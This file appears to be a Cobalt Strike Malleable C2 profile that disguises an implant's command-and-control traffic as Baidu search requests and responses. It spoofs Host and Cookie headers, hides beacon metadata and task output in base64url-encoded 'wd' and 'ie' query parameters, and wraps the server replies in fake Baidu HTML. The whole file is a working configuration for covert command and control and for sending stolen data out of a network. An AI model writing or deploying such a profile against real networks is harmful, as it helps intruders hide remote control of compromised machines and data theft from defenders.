http-get {

    set uri "/s";

    client {

        header "Host" "www.baidu.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Cookie" "BAIDUID=BAIDUIDIDIDIDIDIDIDIDIDIDIDI"; 
        
        metadata {
            base64url;
            parameter "wd";
        }

        parameter "ie" "utf-8";

    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "China_Baiker";
        header "Connection" "close";
        

        output {
            netbios;
            prepend "<!DOCTYPE html><!--STATUS OK--><html><head><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"><meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"><meta content=\"always\" name=\"referrer\"><meta name=\"theme-color\" content=\"#2932e1\"><link rel=\"shortcut icon\" href=\"/favicon.ico\" type=\"image/x-icon\" /><link rel=\"icon\" sizes=\"any\" mask href=\"//www.baidu.com/img/baidu_85beaf5496f291521eb75ba38eacbd87.svg\">";
            append "href=http://www.baidu.com/link";
            print;
        }
    }
}

http-post {
    
    set uri "/S";
    set verb "GET";

    client {

        header "Host" "www.baidu.com";
        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Cookie" "BAIDUID=BAIDUIDIDIDIDIDIDIDIDIDIDIDI"; 
        
        output {
            base64url;
            parameter "wd";
        }
        
        
        id {
            base64url;
            parameter "ie";
        }
    }

    server {

        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "China_Baiker";
        header "Connection" "close";
        

        output {
            netbios;
            prepend "<!DOCTYPE html><!--STATUS OK--><html><head><meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge,chrome=1\"><meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"><meta content=\"always\" name=\"referrer\"><meta name=\"theme-color\" content=\"#2932e1\"><link rel=\"shortcut icon\" href=\"/favicon.ico\" type=\"image/x-icon\" /><link rel=\"icon\" sizes=\"any\" mask href=\"//www.baidu.com/img/baidu_85beaf5496f291521eb75ba38eacbd87.svg\">";
            append "href=http://www.baidu.com/link";
            print;
        }
    }
}


http-stager {
    server {
        header "Cache-Control" "private, max-age=0";
        header "Content-Type" "text/html; charset=utf-8";
        header "Server" "China_Baiker";
        header "Connection" "close";
    }
}
